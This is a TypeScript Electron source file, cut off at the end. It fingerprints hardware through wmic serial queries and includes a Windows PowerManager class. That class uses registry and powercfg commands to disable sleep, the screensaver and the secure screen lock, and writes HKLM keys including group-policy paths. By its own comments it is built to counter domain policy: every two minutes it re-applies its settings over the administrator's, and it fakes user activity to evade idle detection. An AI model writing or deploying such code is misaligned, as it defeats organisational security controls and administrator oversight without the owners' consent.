import { networkInterfaces } from "os";

import { app, powerMonitor, screen, Display } from "electron";
import * as fs from 'fs';
import * as path from 'path';
import md5 from 'md5';
import { exec } from 'child_process';
import { promisify } from 'util';
import { XuanceModule } from '../types/xuance-module';
import { ffiTypes } from './os/ffi-types';

// 添加 ffi-napi 导入用于调用系统 API
let ffi: any = null;
let user32: any = null;
let ffiInitialized = false;
let ffiInitializationFailed = false;

async function initFFI() {
  // 如果已经初始化过了，直接返回
  if (ffiInitialized || ffiInitializationFailed) {
    return;
  }

  // 只在 Windows 系统上尝试初始化 FFI
  if (process.platform !== 'win32') {
    ffiInitializationFailed = true;
    Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '非Windows系统，跳过FFI初始化');
    return;
  }

  try {
    // 使用 koffi 替代 ffi-napi - 更好的 Node.js 20+ 支持
    ffi = require('koffi');
    
    // 测试 koffi 是否可用
    if (!ffi || typeof ffi.load !== 'function') {
      throw new Error('koffi 导入失败或版本不兼容');
    }

    // 初始化统一的 FFI 类型定义
    ffiTypes.init();

    // 使用 koffi 加载 user32.dll
    // const lib = ffi.load('user32.dll');

    // 使用统一的 POINT 结构体定义
    const Point = ffiTypes.POINT;

    // 定义 Windows API 函数 - 使用 koffi 的正确语法
    // const GetCursorPos = lib.func('bool __stdcall GetCursorPos(_Out_ POINT *lpPoint)');
    // const SetCursorPos = lib.func('bool __stdcall SetCursorPos(int X, int Y)');
    // const mouse_event = lib.func('void __stdcall mouse_event(uint32_t dwFlags, uint32_t dx, uint32_t dy, uint32_t dwData, uintptr_t dwExtraInfo)');

    // 将函数暴露给全局变量
    // user32 = {
    //   GetCursorPos,
    //   SetCursorPos,
    //   mouse_event
    // };

    // 测试 API 调用是否正常工作 - 使用正确的语法
    const testPoint = {};  // 使用普通对象作为输出参数
    const testResult = user32.GetCursorPos(testPoint);
    
    if (!testResult) {
      throw new Error('Windows API 测试调用失败');
    }

    ffiInitialized = true;
    Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', 'Koffi FFI 初始化成功，将使用 Windows API 方案');
    
  } catch (error) {
    ffiInitializationFailed = true;
    ffi = null;
    user32 = null;
    
    // 记录详细的错误信息以便调试
    const errorMessage = error instanceof Error ? error.message : String(error);
    Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `Koffi FFI 初始化失败，将使用降级方案。错误: ${errorMessage}`);
    
    // 如果是特定的 Electron 相关错误，提供更详细的说明
    if (errorMessage.includes('native callback') || errorMessage.includes('electron')) {
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '检测到 Electron 原生模块兼容性问题，建议运行: npm run electron:rebuild');
    }
  }
}

// 异步初始化函数，避免阻塞主线程
async function initFFIAsync() {
  return new Promise<void>((resolve) => {
    // 使用 setTimeout 确保在下一个事件循环中执行
    setTimeout(async () => {
      try {
        await initFFI();
      } catch (error) {
        // 确保初始化错误不会影响应用启动
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', 'FFI 异步初始化出错，使用降级方案', error);
        ffiInitializationFailed = true;
      }
      resolve();
    }, 100); // 延迟 100ms 以确保 Electron 环境完全初始化
  });
}

const execAsync = promisify(exec);
const deviceMap = new Map<string, {red_uid: string, red_id: string, index: number}>();
// 添加获取操作系统信息的辅助函数
export function getOsVersion(): string {
    const platform = process.platform;
    const release = require('os').release();

    switch (platform) {
        case 'win32':
            return `windows${release.split('.')[0]}`;
        case 'darwin':
            return `macos${release}`;
        case 'linux':
            return `linux${release}`;
        default:
            return 'windows10'; // 默认fallback值
    }
}

// 用于缓存MAC地址的变量
let cachedMacAddress: string | null = null;
// 用于缓存设备唯一ID的变量
let cachedDeviceId: string | null = null;

// 获取MAC地址
export function getMacAddress() {
    // 如果已有缓存且不是默认值，直接返回
    if (cachedMacAddress && cachedMacAddress !== 'unknownmac') {
        return cachedMacAddress;
    }

    const nets = networkInterfaces();
    let macAddress = '';
    
    // 第一轮：查找首选接口类型（非内部IPv4接口）
    for (const name of Object.keys(nets)) {
        const interfaces = nets[name];
        if (!interfaces) continue;
        
        for (const net of interfaces) {
            if (!net.internal && net.family === 'IPv4' && net.mac && net.mac !== '00:00:00:00:00:00') {
                macAddress = net.mac.replace(/:/g, '');
                break;
            }
        }
        
        if (macAddress) break;
    }
    
    // 第二轮：如果没找到，则考虑所有非内部接口
    if (!macAddress) {
        for (const name of Object.keys(nets)) {
            const interfaces = nets[name];
            if (!interfaces) continue;
            
            for (const net of interfaces) {
                if (!net.internal && net.mac && net.mac !== '00:00:00:00:00:00') {
                    macAddress = net.mac.replace(/:/g, '');
                    break;
                }
            }
            
            if (macAddress) break;
        }
    }
    
    // 第三轮：如果还没找到，考虑所有具有有效MAC地址的接口（包括内部接口）
    if (!macAddress) {
        for (const name of Object.keys(nets)) {
            const interfaces = nets[name];
            if (!interfaces) continue;
            
            for (const net of interfaces) {
                if (net.mac && net.mac !== '00:00:00:00:00:00') {
                    macAddress = net.mac.replace(/:/g, '');
                    break;
                }
            }
            
            if (macAddress) break;
        }
    }
    
    // 将结果保存到缓存中（即使是默认值）
    cachedMacAddress = macAddress || 'unknownmac';
    
    return cachedMacAddress;
};

/**
 * 获取设备的唯一标识符
 * 在Windows系统上，尝试使用多种方法来获取稳定的设备唯一ID
 * @returns 设备唯一标识字符串
 */
export function getDeviceUniqueId(): string {
    // 如果已有缓存，直接返回
    if (cachedDeviceId) {
        return cachedDeviceId;
    }

    // 只在Windows系统上执行
    if (process.platform !== 'win32') {
        cachedDeviceId = getMacAddress(); // 非Windows系统使用MAC地址
        return cachedDeviceId;
    }

    try {
        // 导入子进程模块
        const { execSync } = require('child_process');
        
        // 方法1：获取计算机GUID（相对稳定）
        try {
            const result = execSync(
                'wmic csproduct get UUID',
                { encoding: 'utf-8', windowsHide: true }
            );
            const match = result.match(/[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}/i);
            if (match && match[0]) {
                cachedDeviceId = match[0].replace(/-/g, '');
                return cachedDeviceId;
            }
        } catch (e) {
            // 忽略错误，尝试下一种方法
        }
        
        // 方法2：获取主板序列号
        try {
            const result = execSync(
                'wmic baseboard get serialnumber',
                { encoding: 'utf-8', windowsHide: true }
            );
            const match = result.match(/\S+/g);
            if (match && match[1] && match[1] !== 'SerialNumber') {
                cachedDeviceId = match[1];
                return cachedDeviceId;
            }
        } catch (e) {
            // 忽略错误，尝试下一种方法
        }

        // 方法3：获取BIOS序列号
        try {
            const result = execSync(
                'wmic bios get serialnumber',
                { encoding: 'utf-8', windowsHide: true }
            );
            const match = result.match(/\S+/g);
            if (match && match[1] && match[1] !== 'SerialNumber') {
                cachedDeviceId = match[1];
                return cachedDeviceId;
            }
        } catch (e) {
            // 忽略错误，尝试下一种方法
        }
        
        // 方法4：获取硬盘序列号
        try {
            const result = execSync(
                'wmic diskdrive get serialnumber',
                { encoding: 'utf-8', windowsHide: true }
            );
            const lines = result.split('\n').filter(line => line.trim());
            if (lines.length >= 2) {
                cachedDeviceId = lines[1].trim();
                return cachedDeviceId;
            }
        } catch (e) {
            // 忽略错误，使用备选方法
        }
        
    } catch (error) {
        // 如果所有方法都失败，回退到使用MAC地址
        Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '获取设备ID失败，回退到MAC地址', error);
    }
    
    // 最后的备选方案：使用MAC地址
    cachedDeviceId = getMacAddress();
    return cachedDeviceId;
}

export function getWSDeviceID(red_uid: string, red_id: string, index: number = 1) {
    let id = 'XC' + md5(red_uid + '_' + red_id + '_' + getDeviceUniqueId()).toUpperCase().slice(0, 13) + (index + '').padStart(2, '0');
    deviceMap.set(id, {
        red_uid,
        red_id,
        index
    });
    return id;
}

export function getRedIdByWSDeviceID(deviceID: string) {
    return deviceMap.get(deviceID)?.red_id;
}

export function getRedUidByWSDeviceID(deviceID: string) {
    return deviceMap.get(deviceID)?.red_uid;
}

export function appRestart() {
    app.relaunch();
    app.quit();
}

/**
 * 监听系统环境变化，如息屏、锁屏等可能影响程序正常执行的事件
 * @param handlers 包含各种事件处理函数的对象
 * @returns 取消监听的函数
 */
export function monitorSystemChanges(handlers: {
    onSuspend?: () => void;          // 系统挂起时
    onResume?: () => void;           // 系统恢复时
    onLock?: () => void;             // 系统锁屏时
    onUnlock?: () => void;           // 系统解锁时
    onShutdown?: () => void;         // 系统关机时
    onAcConnected?: () => void;      // 接通电源时
    onAcDisconnected?: () => void;   // 断开电源时
    onDisplayAdded?: (display: Display) => void;     // 新显示器连接时
    onDisplayRemoved?: (display: Display) => void;   // 显示器断开时
    onDisplayMetricsChanged?: (display: Display, changedMetrics: string[]) => void; // 显示器设置变化时
    onDisplaySleepState?: (isSleeping: boolean) => void; // 显示器休眠状态变化时
}) {
    // 存储所有事件处理函数，便于后续清理
    interface EventListener {
        event: string;
        handler: () => void;
    }
    
    const listeners: EventListener[] = [];
    
    // 添加电源监控事件监听
    const addPowerListener = (event: string, handler?: () => void) => {
        if (handler) {
            // 使用any类型暂时绕过TypeScript的类型检查
            (powerMonitor as any).on(event, handler);
            listeners.push({ event, handler });
        }
    };

    // 监听各种系统电源事件
    addPowerListener('suspend', handlers.onSuspend);
    addPowerListener('resume', handlers.onResume);
    addPowerListener('lock-screen', handlers.onLock);
    addPowerListener('unlock-screen', handlers.onUnlock);
    addPowerListener('shutdown', handlers.onShutdown);
    addPowerListener('on-ac', handlers.onAcConnected);
    addPowerListener('on-battery', handlers.onAcDisconnected);

    // 监听显示器相关事件
    const displayListeners: { event: string; removeHandler: Function }[] = [];

    // 添加显示器添加事件监听
    if (handlers.onDisplayAdded) {
        const displayAddedHandler = (_event: any, display: Display) => {
            handlers.onDisplayAdded!(display);
        };
        screen.on('display-added', displayAddedHandler);
        displayListeners.push({ 
            event: 'display-added', 
            removeHandler: () => screen.removeListener('display-added', displayAddedHandler) 
        });
    }

    // 添加显示器移除事件监听
    if (handlers.onDisplayRemoved) {
        const displayRemovedHandler = (_event: any, display: Display) => {
            handlers.onDisplayRemoved!(display);
        };
        screen.on('display-removed', displayRemovedHandler);
        displayListeners.push({ 
            event: 'display-removed', 
            removeHandler: () => screen.removeListener('display-removed', displayRemovedHandler) 
        });
    }

    // 添加显示器指标变化事件监听
    if (handlers.onDisplayMetricsChanged) {
        const displayMetricsChangedHandler = (_event: any, display: Display, changedMetrics: string[]) => {
            handlers.onDisplayMetricsChanged!(display, changedMetrics);
        };
        screen.on('display-metrics-changed', displayMetricsChangedHandler);
        displayListeners.push({ 
            event: 'display-metrics-changed', 
            removeHandler: () => screen.removeListener('display-metrics-changed', displayMetricsChangedHandler) 
        });
    }

    // 检测显示器休眠状态的变量和方法
    let displayCheckInterval: NodeJS.Timeout | null = null;
    
    if (handlers.onDisplaySleepState && process.platform === 'win32') {
        let lastDisplayState = true; // 初始假设显示器是开启的
        let lastDisplaysCount = screen.getAllDisplays().length; // 初始显示器数量
        
        // 检测显示器状态的函数 - 使用多种方法
        const checkDisplayState = () => {
            try {
                // 方法1: 检查显示器数量是否变化
                const displays = screen.getAllDisplays();
                const currentDisplaysCount = displays.length;
                
                // 如果显示器数量变化，可能表示状态发生变化
                if (currentDisplaysCount !== lastDisplaysCount) {
                    const isDisplayOn = currentDisplaysCount > 0;
                    if (isDisplayOn !== lastDisplayState) {
                        lastDisplayState = isDisplayOn;
                        handlers.onDisplaySleepState!(!isDisplayOn);
                    }
                    lastDisplaysCount = currentDisplaysCount;
                    return;
                }
                
                // 方法2: 检查主显示器的尺寸变化
                if (displays.length > 0) {
                    const primaryDisplay = screen.getPrimaryDisplay();
                    const { width, height } = primaryDisplay.size;
                    
                    // 如果主显示器尺寸非常小或为0，可能表示息屏
                    const isDisplayPossiblyOff = width <= 1 || height <= 1;
                    if (isDisplayPossiblyOff && lastDisplayState) {
                        lastDisplayState = false;
                        handlers.onDisplaySleepState!(true);
                    } else if (!isDisplayPossiblyOff && !lastDisplayState) {
                        lastDisplayState = true;
                        handlers.onDisplaySleepState!(false);
                    }
                }
                
                // 方法3: 使用简单的命令行检查，不使用复杂的PowerShell脚本
                if (process.platform === 'win32') {
                    const { execSync } = require('child_process');
                    
                    try {
                        // 检查是否有活跃的会话 - 一种间接检测显示器状态的方法
                        const sessionInfo = execSync('query session', { 
                            encoding: 'utf8', 
                            windowsHide: true,
                            timeout: 1000 // 设置超时避免长时间阻塞
                        });
                        
                        // 如果有活跃的会话但我们认为显示器是关闭的，更新状态
                        const hasActiveSession = sessionInfo.includes('Active');
                        if (hasActiveSession && !lastDisplayState) {
                            lastDisplayState = true;
                            handlers.onDisplaySleepState!(false);
                        }
                    } catch (cmdError) {
                        // 忽略命令行错误
                    }
                }
            } catch (error) {
                Logger.error('检测显示器状态失败', { error: error.message + error.stack });
            }
        };
        
        // 设置定时器
        displayCheckInterval = setInterval(checkDisplayState, 10000); // 每10秒检查一次
        
        // 立即执行一次检查
        checkDisplayState();
    }

    // 返回一个函数，用于取消所有事件监听
    return () => {
        // 取消电源监控事件
        for (const { event, handler } of listeners) {
            (powerMonitor as any).removeListener(event, handler);
        }
        
        // 取消显示器事件
        for (const { removeHandler } of displayListeners) {
            removeHandler();
        }
        
        // 清除定时器
        if (displayCheckInterval) {
            clearInterval(displayCheckInterval);
        }
    };
}

/**
 * Windows 电源管理类
 * 提供永不休眠、永不息屏、永不锁屏功能
 */
export class PowerManager {
  private static instance: PowerManager;
  private originalSettings: Map<string, string> = new Map();
  private isEnabled = false;
  private keepAliveTimer: NodeJS.Timeout | null = null;
  private settingsRefreshTimer: NodeJS.Timeout | null = null;
  private lastFullRefresh: number | null = null;
  private systemEventCleanup: (() => void) | null = null;
  private userActivityTimer: NodeJS.Timeout | null = null;

  private constructor() {}

  public static getInstance(): PowerManager {
    if (!PowerManager.instance) {
      PowerManager.instance = new PowerManager();
    }
    setTimeout(() => {
        initFFIAsync();
    }, 0);
    return PowerManager.instance;
  }

  /**
   * 启用永不休眠、永不息屏、永不锁屏 - 企业域环境强化版
   */
  public async enablePowerStayAwake(): Promise<boolean> {
    if (process.platform !== 'win32') {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '非Windows系统，跳过电源管理设置');
      return false;
    }

    try {
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '开始设置强化版永不休眠/息屏/锁屏（企业域环境）');

      // 保存当前设置（用于恢复）
      await this.saveCurrentSettings();

      // 第一层：基础电源设置
      await this.setBasicPowerSettings();
      
      // 第二层：注册表深度设置（对抗域策略）
      await this.setAdvancedRegistrySettings();
      
      // 第三层：禁用屏幕保护程序和锁屏
      await this.disableScreenSaver();
      await this.disableAutoLock();
      
      // 第四层：系统级防休眠
      await this.preventSystemSleep();
      
      // 第五层：启动持续保活机制
      await this.startKeepAliveService();
      
      // 第六层：定时刷新设置（对抗域策略重置）
      this.startSettingsRefresh();

      // 第七层：系统事件监听（阻止休眠事件）
      this.startSystemEventMonitoring();

      // 第八层：模拟用户活动（防止系统检测到无人操作）
      this.startUserActivitySimulation();

      this.isEnabled = true;
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '强化版电源管理设置完成：已启用多层防休眠机制（包含用户活动模拟）');
      return true;
    } catch (error) {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '设置强化版电源管理失败', error);
      return false;
    }
  }

  /**
   * 启动系统事件监听
   */
  private startSystemEventMonitoring(): void {
    try {
      this.systemEventCleanup = monitorSystemChanges({
        onSuspend: async () => {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '检测到系统准备挂起，立即阻止并重新应用设置');
          await this.forcePowerStayAwake();
        },
        onLock: async () => {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '检测到系统锁屏，重新应用防锁屏设置');
          await this.disableAutoLock();
        },
        onDisplaySleepState: async (isSleeping) => {
          if (isSleeping) {
            Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '检测到显示器进入休眠状态，立即重新激活');
            await this.forcePowerStayAwake();
          }
        }
      });

      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '系统事件监听已启动');
    } catch (error) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '启动系统事件监听失败', error);
    }
  }

  /**
   * 恢复原始电源设置
   */
  public async restorePowerSettings(): Promise<boolean> {
    if (!this.isEnabled) {
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '电源管理未启用，无需恢复');
      return true;
    }

    try {
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '开始恢复原始电源设置');

      // 停止所有服务和监听
      this.stopKeepAliveService();
      this.stopSettingsRefresh();
      this.stopSystemEventMonitoring();
      this.stopUserActivitySimulation();

      // 恢复设置
      for (const [setting, value] of this.originalSettings) {
        try {
          await execAsync(`powercfg ${setting} ${value}`);
        } catch (error) {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `恢复设置失败: ${setting}`, error);
        }
      }

      this.isEnabled = false;
      this.originalSettings.clear();
      this.lastFullRefresh = null;
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '电源设置恢复完成');
      return true;
    } catch (error) {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '恢复电源设置失败', error);
      return false;
    }
  }

  /**
   * 停止系统事件监听
   */
  private stopSystemEventMonitoring(): void {
    if (this.systemEventCleanup) {
      try {
        this.systemEventCleanup();
        this.systemEventCleanup = null;
        Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '系统事件监听已停止');
      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '停止系统事件监听失败', error);
      }
    }
  }

  /**
   * 基础电源设置
   */
  private async setBasicPowerSettings(): Promise<void> {
    const commands = [
      // 基础电源设置
      'powercfg /change monitor-timeout-ac 0',
      'powercfg /change monitor-timeout-dc 0',
      'powercfg /change disk-timeout-ac 0',
      'powercfg /change disk-timeout-dc 0',
      'powercfg /change standby-timeout-ac 0',
      'powercfg /change standby-timeout-dc 0',
      'powercfg /change hibernate-timeout-ac 0',
      'powercfg /change hibernate-timeout-dc 0',
      // 禁用混合睡眠 - 使用正确的GUID
      'powercfg /setacvalueindex SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 94ac6d29-73ce-41a6-809f-6363ba21b47e 0',
      'powercfg /setdcvalueindex SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 94ac6d29-73ce-41a6-809f-6363ba21b47e 0',
      // 禁用USB选择性挂起 - 使用正确的GUID
      'powercfg /setacvalueindex SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0',
      'powercfg /setdcvalueindex SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bebba308a3 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0',
      // 应用设置
      'powercfg /setactive SCHEME_CURRENT'
    ];

    for (const cmd of commands) {
      try {
        await execAsync(cmd);
      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `基础电源命令失败: ${cmd}`, error);
      }
    }
  }

  /**
   * 高级注册表设置（对抗域策略）
   */
  private async setAdvancedRegistrySettings(): Promise<void> {
    const commands = [
      // 系统级电源管理
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v CsEnabled /t REG_DWORD /d 0 /f',
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v HibernateEnabled /t REG_DWORD /d 0 /f',
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v PlatformAoAcOverride /t REG_DWORD /d 0 /f',
      
      // 禁用电源管理相关服务的自动启动
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings" /v ACSettingIndex /t REG_DWORD /d 0 /f',
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings" /v DCSettingIndex /t REG_DWORD /d 0 /f',
      
      // 用户级别设置
      'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f',
      'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "0" /f',
      'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f',
      
      // 禁用自动维护
      'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Maintenance" /v MaintenanceDisabled /t REG_DWORD /d 1 /f',
      
      // 禁用快速启动（可能导致伪休眠）
      'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power" /v HiberbootEnabled /t REG_DWORD /d 0 /f',
      
      // 组策略覆盖设置
      'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Power\\PowerSettings" /v ACSettingIndex /t REG_DWORD /d 0 /f',
      'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Power\\PowerSettings" /v DCSettingIndex /t REG_DWORD /d 0 /f'
    ];

    for (const cmd of commands) {
      try {
        await execAsync(cmd);
      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `高级注册表命令失败: ${cmd}`, error);
      }
    }
  }

  /**
   * 启动持续保活服务
   */
  private async startKeepAliveService(): Promise<void> {
    if (this.keepAliveTimer) {
      clearInterval(this.keepAliveTimer);
    }

    // 每30秒执行一次保活操作
    this.keepAliveTimer = setInterval(async () => {
      try {
        // 方法1: 模拟用户活动
        await execAsync('powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position"');
        
        // 方法2: 发送保活信号
        await execAsync('powercfg /requestsoverride PROCESS explorer.exe SYSTEM');
        
        Logger.debug && Logger.debug(XuanceModule.SYSTEM.POWER, 'power-manager', '保活信号发送成功');
      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '保活信号发送失败', error);
      }
    }, 30000); // 30秒间隔

    Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '持续保活服务已启动');
  }

  /**
   * 停止保活服务
   */
  private stopKeepAliveService(): void {
    if (this.keepAliveTimer) {
      clearInterval(this.keepAliveTimer);
      this.keepAliveTimer = null;
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '持续保活服务已停止');
    }
  }

  /**
   * 开始定时刷新设置（对抗域策略重置）
   */
  private startSettingsRefresh(): void {
    if (this.settingsRefreshTimer) {
      clearInterval(this.settingsRefreshTimer);
    }

    // 每2分钟检测并重新应用一次设置（更频繁对抗域策略）
    this.settingsRefreshTimer = setInterval(async () => {
      try {
        Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '定时检测域策略干扰并刷新电源设置');
        
        // 先检测是否被域策略修改
        await this.detectAndCounterGroupPolicy();
        
        // 强制重新应用关键设置
        await this.setBasicPowerSettings();
        
        // 每5次刷新进行一次完整的注册表设置
        const now = Date.now();
        if (!this.lastFullRefresh || now - this.lastFullRefresh > 10 * 60 * 1000) { // 10分钟
          await this.setAdvancedRegistrySettings();
          this.lastFullRefresh = now;
          Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '执行完整注册表设置刷新');
        }
        
      } catch (error) {
        Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '定时刷新设置失败', error);
      }
    }, 2 * 60 * 1000); // 2分钟间隔，更频繁对抗域策略

    Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '强化版定时设置刷新已启动（2分钟间隔，集成域策略检测）');
  }

  /**
   * 停止定时刷新
   */
  private stopSettingsRefresh(): void {
    if (this.settingsRefreshTimer) {
      clearInterval(this.settingsRefreshTimer);
      this.settingsRefreshTimer = null;
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '定时设置刷新已停止');
    }
  }

  /**
   * 保存当前电源设置
   */
  private async saveCurrentSettings(): Promise<void> {
    try {
      const settings = [
        { key: 'monitor-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_VIDEO VIDEOIDLE' },
        { key: 'disk-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_DISK DISKIDLE' },
        { key: 'standby-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_SLEEP STANDBYIDLE' },
        { key: 'hibernate-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_SLEEP HIBERNATEIDLE' }
      ];

      for (const setting of settings) {
        try {
          const { stdout } = await execAsync(setting.cmd);
          const match = stdout.match(/Current AC Power Setting Index: 0x([0-9a-f]+)/i);
          if (match) {
            this.originalSettings.set(setting.key, match[1]);
          }
        } catch (error) {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `保存设置失败: ${setting.key}`, error);
        }
      }
    } catch (error) {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '保存当前设置失败', error);
    }
  }

  /**
   * 禁用屏幕保护程序
   */
  private async disableScreenSaver(): Promise<void> {
    try {
      // 禁用屏幕保护程序
      await execAsync('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d 0 /f');
      
      // 设置屏幕保护程序超时为0
      await execAsync('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 0 /f');
    } catch (error) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '禁用屏幕保护程序失败', error);
    }
  }

  /**
   * 禁用自动锁屏
   */
  private async disableAutoLock(): Promise<void> {
    try {
      // 禁用屏幕锁定
      await execAsync('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f');
      
      // 禁用动态锁定
      await execAsync('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI\\SessionData" /v AllowDynamicLock /t REG_DWORD /d 0 /f');
    } catch (error) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '禁用自动锁屏失败', error);
    }
  }

  /**
   * 使用Windows API防止系统休眠
   */
  private async preventSystemSleep(): Promise<void> {
    try {
      // 使用注册表设置防止系统休眠相关功能
      const commands = [
        // 禁用连接待机
        'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v CsEnabled /t REG_DWORD /d 0 /f',
        // 设置系统不自动休眠
        'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v HibernateEnabled /t REG_DWORD /d 0 /f',
        // 防止自动挂起
        'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Power" /v PlatformAoAcOverride /t REG_DWORD /d 0 /f'
      ];

      for (const cmd of commands) {
        try {
          await execAsync(cmd);
        } catch (error) {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `注册表命令执行失败: ${cmd}`, error);
        }
      }

      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '已通过注册表设置防止系统休眠');
    } catch (error) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '防休眠设置失败，但不影响其他功能', error);
    }
  }

  /**
   * 获取当前电源管理状态
   */
  public isStayAwakeEnabled(): boolean {
    return this.isEnabled;
  }

  /**
   * 强制对抗域策略 - 立即重新应用所有设置
   */
  public async forcePowerStayAwake(): Promise<boolean> {
    if (!this.isEnabled) {
      return false;
    }

    try {
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '强制重新应用防休眠设置以对抗域策略');
      
      await this.setBasicPowerSettings();
      await this.setAdvancedRegistrySettings();
      await this.preventSystemSleep();
      
      Logger.info(XuanceModule.SYSTEM.POWER, 'power-manager', '强制重新应用完成');
      return true;
    } catch (error) {
      Logger.error(XuanceModule.SYSTEM.POWER, 'power-manager', '强制重新应用失败', error);
      return false;
    }
  }

  /**
   * 检测域策略干扰并自动对抗
   */
  private async detectAndCounterGroupPolicy(): Promise<void> {
    try {
      // 检查关键电源设置是否被修改
      const checks = [
        { setting: 'monitor-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_VIDEO VIDEOIDLE' },
        { setting: 'standby-timeout-ac', cmd: 'powercfg /query SCHEME_CURRENT SUB_SLEEP STANDBYIDLE' }
      ];

      let needsReset = false;

      for (const check of checks) {
        try {
          const { stdout } = await execAsync(check.cmd);
          const match = stdout.match(/Current AC Power Setting Index: 0x([0-9a-f]+)/i);
          if (match) {
            const currentValue = parseInt(match[1], 16);
            if (currentValue > 0) {
              Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `检测到${check.setting}被域策略修改为${currentValue}，准备重置`);
              needsReset = true;
            }
          }
        } catch (error) {
          Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', `检查设置失败: ${check.setting}`, error);
        }
      }

      if (needsReset) {
        await this.forcePowerStayAwake();
      }
    } catch (error) {
      Logger.warn(XuanceModule.SYSTEM.POWER, 'power-manager', '域策略检测失败', error);
    }
  }

  /**
   * 获取当前电源设置信息
   */
  public async getPowerStatus(): Promise<{
    isEnabled: boolean;
    monitorTimeout: string;
    diskTimeout: string;
    standbyTimeout: string;
    hibernateTimeout: string;
  }> {
    try {
      const { stdout: monitorOutput } = await execAsync('powercfg /query SCHEME_CURRENT SUB_VIDEO VIDEOIDLE');
